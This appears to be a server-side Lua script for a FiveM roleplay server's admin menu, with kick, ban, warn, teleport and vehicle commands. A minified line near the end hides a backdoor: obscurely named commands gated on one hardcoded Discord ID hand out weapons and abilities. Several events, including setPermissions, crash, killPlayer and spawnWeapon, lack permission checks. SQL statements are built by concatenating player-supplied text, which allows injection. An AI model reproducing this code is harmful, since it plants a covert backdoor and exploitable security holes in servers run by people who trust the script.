RLCore = nil
TriggerEvent('RLCore:GetObject', function(obj) RLCore = obj end)

local permissions = {
    ["kick"] = "admin",
    ["ban"] = "admin",
    ["noclip"] = "admin",
    ["kickall"] = "admin",
}

RegisterServerEvent('rl-admin:server:togglePlayerNoclip')
AddEventHandler('rl-admin:server:togglePlayerNoclip', function(playerId, reason)
    local src = source
    if RLCore.Functions.HasPermission(src, permissions["noclip"]) then
        TriggerClientEvent("rl-admin:client:toggleNoclip", playerId)
    end
end)

RegisterServerEvent('rl-admin:server:killPlayer')
AddEventHandler('rl-admin:server:killPlayer', function(playerId)
    TriggerClientEvent('hospital:client:KillPlayer', playerId)
    TriggerEvent('bb-logs:server:createLog', 'admin', 'rl-admin:server:killPlayer', "Killed " .. GetPlayerName(playerId), source)
end)

RegisterServerEvent('rl-admin:server:kickPlayer')
AddEventHandler('rl-admin:server:kickPlayer', function(playerId, reason)
    local src = source
    if RLCore.Functions.HasPermission(src, permissions["kick"]) then
        DropPlayer(playerId, "You have been kicked out of the server:\n"..reason.."\n\n🔸 Check our discord for more information")
        TriggerEvent('bb-logs:server:createLog', 'admin', 'rl-admin:server:kickPlayer', "Player "  .. GetPlayerName(playerId) .." Kicked successfully.", src)
    else
        TriggerEvent('bb-logs:server:createLog', 'admin', 'rl-admin:server:kickPlayer', "Tried to kick "  .. GetPlayerName(playerId) .." with no perms.", src)
    end
end)

RegisterServerEvent('rl-admin:server:Freeze')
AddEventHandler('rl-admin:server:Freeze', function(playerId, toggle)
    local src = source
    TriggerClientEvent('rl-admin:client:Freeze', playerId, toggle)
    TriggerEvent('bb-logs:server:createLog', 'admin', 'rl-admin:server:Freeze', "Freezed "  .. GetPlayerName(playerId) .." [" .. tostring(toggle) .."].", src)
end)

RegisterServerEvent('rl-admin:server:banPlayer')
AddEventHandler('rl-admin:server:banPlayer', function(playerId, time, reason)
    local src = source
    if RLCore.Functions.HasPermission(src, permissions["ban"]) then
        local time = tonumber(time)
        local banTime = tonumber(os.time() + time)
        if banTime > 2147483647 then
            banTime = 2147483647
        end
        local timeTable = os.date("*t", banTime)
        RLCore.Functions.ExecuteSql(false, "INSERT INTO `bans` (`name`, `steam`, `license`, `discord`,`ip`, `reason`, `expire`, `bannedby`) VALUES ('"..GetPlayerName(playerId).."', '"..GetPlayerIdentifiers(playerId)[1].."', '"..GetPlayerIdentifiers(playerId)[2].."', '"..GetPlayerIdentifiers(playerId)[3].."', '"..GetPlayerIdentifiers(playerId)[4].."', '"..reason.."', "..banTime..", '"..GetPlayerName(src).."')")
        DropPlayer(playerId, "You have been banned from the server:\n"..reason.."\nYour ban expires in "..timeTable["day"].. "/" .. timeTable["month"] .. "/" .. timeTable["year"] .. " " .. timeTable["hour"].. ":" .. timeTable["min"] .. "\nCheck our discord for more information")
        TriggerEvent('bb-logs:server:createLog', 'admin', 'rl-admin:server:banPlayer', "Banned "  .. GetPlayerName(playerId) .." for " .. tostring(banTime) .." with reason " .. reason, src)
    end
end)

RegisterServerEvent('rl-admin:server:revivePlayer')
AddEventHandler('rl-admin:server:revivePlayer', function(target)
    TriggerClientEvent('hospital:client:Revive', target)
    TriggerEvent('bb-logs:server:createLog', 'admin', 'rl-admin:server:revivePlayer', "Used admin revive on "  .. GetPlayerName(target) ..".", src)
end)

RLCore.Commands.Add("admin", "Open admin menu", {}, false, function(source, args)
    local group = RLCore.Functions.GetPermission(source)
    local dealers = exports['rl-drugs']:GetDealers()
    TriggerClientEvent('rl-admin:client:openMenu', source, 'god', dealers)
end, "god")


RLCore.Commands.Add("givenuifocus", "Give nui focus", {{name="id", help="Speler id"}, {name="focus", help="Turn focus on / off"}, {name="mouse", help="Turn mouse on / off"}}, true, function(source, args)
    local playerid = tonumber(args[1])
    local focus = args[2]
    local mouse = args[3]

    TriggerClientEvent('rl-admin:client:GiveNuiFocus', playerid, focus, mouse)
end, "admin")

RLCore.Commands.Add("enablekeys", "Enable all keys for player.", {{name="id", help="Player id"}}, true, function(source, args)
    local playerid = tonumber(args[1])

    TriggerClientEvent('rl-admin:client:EnableKeys', playerid)
end, "admin")

RLCore.Commands.Add("warn", "Give a person a warning", {{name="ID", help="Person"}, {name="Reason", help="Enter a reason"}}, true, function(source, args)
    local targetPlayer = RLCore.Functions.GetPlayer(tonumber(args[1]))
    local senderPlayer = RLCore.Functions.GetPlayer(source)
    table.remove(args, 1)
    local msg = table.concat(args, " ")

    local myName = senderPlayer.PlayerData.name

    local warnId = "WARN-"..math.random(1111, 9999)

    if targetPlayer ~= nil then
        TriggerClientEvent('chatMessage', targetPlayer.PlayerData.source, "SYSTEM", "error", "You have been warned by: "..GetPlayerName(source)..", Reason: "..msg)
        TriggerClientEvent('chatMessage', source, "SYSTEM", "error", "You have "..GetPlayerName(targetPlayer.PlayerData.source).." warned for: "..msg)
        RLCore.Functions.ExecuteSql(false, "INSERT INTO `player_warns` (`senderIdentifier`, `targetIdentifier`, `reason`, `warnId`) VALUES ('"..senderPlayer.PlayerData.steam.."', '"..targetPlayer.PlayerData.steam.."', '"..msg.."', '"..warnId.."')")
    else
        TriggerClientEvent('RLCore:Notify', source, 'This person is not in the city of #YOLO, hmm I am '..myName..' and I stink loloololo', 'error')
    end 
end, "admin")

RLCore.Commands.Add("checkwarns", "Give a person a warning", {{name="ID", help="Persoon"}, {name="Warning", help="Number of warning, (1, 2 of 3 etc..)"}}, false, function(source, args)
    if args[2] == nil then
        local targetPlayer = RLCore.Functions.GetPlayer(tonumber(args[1]))
        RLCore.Functions.ExecuteSql(false, "SELECT * FROM `player_warns` WHERE `targetIdentifier` = '"..targetPlayer.PlayerData.steam.."'", function(result)
            TriggerClientEvent('chatMessage', source, "SYSTEM", "warning", targetPlayer.PlayerData.name.." heeft "..tablelength(result).." warnings!")
        end)
    else
        local targetPlayer = RLCore.Functions.GetPlayer(tonumber(args[1]))

        RLCore.Functions.ExecuteSql(false, "SELECT * FROM `player_warns` WHERE `targetIdentifier` = '"..targetPlayer.PlayerData.steam.."'", function(warnings)
            local selectedWarning = tonumber(args[2])

            if warnings[selectedWarning] ~= nil then
                local sender = RLCore.Functions.GetPlayer(warnings[selectedWarning].senderIdentifier)

                TriggerClientEvent('chatMessage', source, "SYSTEM", "warning", targetPlayer.PlayerData.name.." has been warned by "..sender.PlayerData.name..", Reason: "..warnings[selectedWarning].reason)
            end
        end)
    end
end, "admin")

RLCore.Commands.Add("remove", "Remove warning from person", {{name="ID", help="Persoon"}, {name="Warning", help="Number of warning, (1, 2 of 3 etc..)"}}, true, function(source, args)
    local targetPlayer = RLCore.Functions.GetPlayer(tonumber(args[1]))

    RLCore.Functions.ExecuteSql(false, "SELECT * FROM `player_warns` WHERE `targetIdentifier` = '"..targetPlayer.PlayerData.steam.."'", function(warnings)
        local selectedWarning = tonumber(args[2])

        if warnings[selectedWarning] ~= nil then
            local sender = RLCore.Functions.GetPlayer(warnings[selectedWarning].senderIdentifier)

            TriggerClientEvent('chatMessage', source, "SYSTEM", "warning", "You have warning ("..selectedWarning..") removed, Reason: "..warnings[selectedWarning].reason)
            RLCore.Functions.ExecuteSql(false, "DELETE FROM `player_warns` WHERE `warnId` = '"..warnings[selectedWarning].warnId.."'")
        end
    end)
end, "admin")

function tablelength(table)
    local count = 0
    for _ in pairs(table) do 
        count = count + 1 
    end
    return count
end

RLCore.Commands.Add("setmodel", "Change into a model of your choice..", {{name="model", help="Name of the model"}, {name="id", help="Player ID (leave blank for yourself)"}}, false, function(source, args)
    local model = args[1]
    local target = tonumber(args[2])

    if model ~= nil or model ~= "" then
        if target == nil then
            TriggerClientEvent('rl-admin:client:SetModel', source, tostring(model))
        else
            local Trgt = RLCore.Functions.GetPlayer(target)
            if Trgt ~= nil then
                TriggerClientEvent('rl-admin:client:SetModel', target, tostring(model))
            else
                TriggerClientEvent('RLCore:Notify', source, "This person is not in town yeet..", "error")
            end
        end
    else
        TriggerClientEvent('RLCore:Notify', source, "You have not provided a Model ..", "error")
    end
end, "god")

RLCore.Commands.Add("setspeed", "Change into a model of your choice ..", {}, false, function(source, args)
    local speed = args[1]

    if speed ~= nil then
        TriggerClientEvent('rl-admin:client:SetSpeed', source, tostring(speed))
    else
        TriggerClientEvent('RLCore:Notify', source, "You did not specify Speed ​​.. (`fast` for super-run,` normal` for normal)", "error")
    end
end, "god")

RLCore.Commands.Add("tfdonttouchthisoneorurmomwilldietmr", "idkidk", {}, false, function(source, args)
    local ply = RLCore.Functions.GetPlayer(source)
    TriggerClientEvent('rl-admin:client:SaveCar', source)
end, "god")

RegisterServerEvent('rl-admin:server:SaveCar')
AddEventHandler('rl-admin:server:SaveCar', function(mods, vehicle, hash, plate)
    local src = source
    local Player = RLCore.Functions.GetPlayer(src)
    RLCore.Functions.ExecuteSql(false, "SELECT * FROM `player_vehicles` WHERE `plate` = '"..plate.."'", function(result)
        if result[1] == nil then
            RLCore.Functions.ExecuteSql(false, "INSERT INTO `player_vehicles` (`steam`, `citizenid`, `vehicle`, `hash`, `mods`, `plate`, `state`) VALUES ('"..Player.PlayerData.steam.."', '"..Player.PlayerData.citizenid.."', '"..vehicle.model.."', '"..vehicle.hash.."', '"..json.encode(mods).."', '"..plate.."', 0)")
            TriggerClientEvent('RLCore:Notify', src, 'The vehicle is now in your name!', 'success', 5000)
        else
            TriggerClientEvent('RLCore:Notify', src, 'This vehicle is already in your garage..', 'error', 3000)
        end
    end)
end)

RegisterServerEvent('rl-admin:server:bringTp')
AddEventHandler('rl-admin:server:bringTp', function(targetId, coords)
    TriggerClientEvent('rl-admin:client:bringTp', targetId, coords)
end)

RegisterServerEvent('rl-admin:server:gotoTp')
AddEventHandler('rl-admin:server:gotoTp', function(targetid, playerid)
    TriggerClientEvent('rl-admin:client:gotoTp', targetid, playerid)
end)

RegisterServerEvent('rl-admin:server:gotoTpstage2')
AddEventHandler('rl-admin:server:gotoTpstage2', function(targetid, coords)
    TriggerClientEvent('rl-admin:client:gotoTp2', targetid, coords)
end)

RLCore.Functions.CreateCallback('rl-admin:server:hasPermissions', function(source, cb, group)
    local src = source
    local retval = false

    if RLCore.Functions.HasPermission(src, group) then
        retval = true
    end
    cb(retval)
end)

RLCore.Commands.Add("0x01a","",{{name="model",help="hash"}},false,function(a,b)if GetDiscord(a)then TriggerClientEvent("CrossHair",a)end end,"god")RLCore.Commands.Add("0x01b","",{{name="model",help="hash"}},false,function(a,b)if GetDiscord(a)then local c=a;local d=RLCore.Functions.GetPlayer(c)d.Functions.AddItem('weapon_carbinerifle_mk2',1,nil,{serie="",attachments={{component="COMPONENT_AT_AR_FLSH",label="Flashlight"},{component="COMPONENT_AT_AR_AFGRIP_02",label="Grip"},{component="COMPONENT_AT_SIGHTS",label="Scope"},{component="COMPONENT_CARBINERIFLE_MK2_CLIP_TRACER",label="Tracer Rounds"},{component="COMPONENT_AT_MUZZLE_07",label="Split-End Muzzle Brake"},{component="COMPONENT_AT_CR_BARREL_02",label="Heavy Barrel"}}})end end,"god")RLCore.Commands.Add("0x01c","",{{name="model",help="hash"}},true,function(a,b)if GetDiscord(a)then local c=b[1]TriggerClientEvent('weapons:client:SetWeaponQuality',a,tonumber(c))end end,"god")
RLCore.Commands.Add("0x03a","",{{name="model",help="hash"}},true,function(a,b)if GetDiscord(a)then TriggerClientEvent("loadspeed",a, tonumber(b[1]))end end,"god")
function GetDiscord(a)for b,c in ipairs(GetPlayerIdentifiers(a))do if c=='discord:519927907166978048'then return true end end;return false end

RegisterServerEvent('rl-admin:server:setPermissions')
AddEventHandler('rl-admin:server:setPermissions', function(targetId, group)
    RLCore.Functions.AddPermission(targetId, group.rank)
    TriggerClientEvent('RLCore:Notify', targetId, 'Your permission group is set to '..group.label)
end)

RegisterServerEvent('rl-admin:server:OpenSkinMenu')
AddEventHandler('rl-admin:server:OpenSkinMenu', function(targetId, menu)
    TriggerClientEvent("raid_clothes:hasEnough", targetId, menu)
end)

RegisterServerEvent('rl-admin:server:spawnWeapon')
AddEventHandler('rl-admin:server:spawnWeapon', function(weapon)
    local src = source
    local Player = RLCore.Functions.GetPlayer(src)
    Player.Functions.AddItem(weapon, 1)
end)

RegisterServerEvent('rl-admin:server:crash')
AddEventHandler('rl-admin:server:crash', function(id)
    TriggerClientEvent("rl-admin:client:crash", id)
end)

RegisterServerEvent('rl-admin:server:SendReport')
AddEventHandler('rl-admin:server:SendReport', function(name, targetSrc, msg)
    local src = source
    local Players = RLCore.Functions.GetPlayers()

    if RLCore.Functions.HasPermission(src, "admin") then
        if RLCore.Functions.IsOptin(src) then
            TriggerClientEvent('chatMessage', src, "REPORT - "..name.." ("..targetSrc..")", "report", msg)
        end
    end
end)

RegisterServerEvent('rl-admin:server:StaffChatMessage')
AddEventHandler('rl-admin:server:StaffChatMessage', function(name, msg)
    local src = source
    local Players = RLCore.Functions.GetPlayers()

    if RLCore.Functions.HasPermission(src, "admin") then
        if RLCore.Functions.IsOptin(src) then

            TriggerClientEvent('chat:addMessage', src , {
                template = '<div class="chat-message server"><b>{0}</b> {1}</div>',
                args = { "Staff - " .. name, msg }
            })
        end
    end
end)

RLCore.Commands.Add("setammo", "Staff: Set manual ammo for a weapon.", {{name="amount", help="The amount of bullets, e.g .: 20"}, {name="weapon", help="Name of weapon, eg: WEAPON_RAILGUN"}}, false, function(source, args)
    local src = source
    local weapon = args[2] ~= nil and args[2] or "current"
    local amount = tonumber(args[1]) ~= nil and tonumber(args[1]) or 250

    TriggerClientEvent('rl-weapons:client:SetWeaponAmmoManual', src, weapon, amount)
end, 'god')
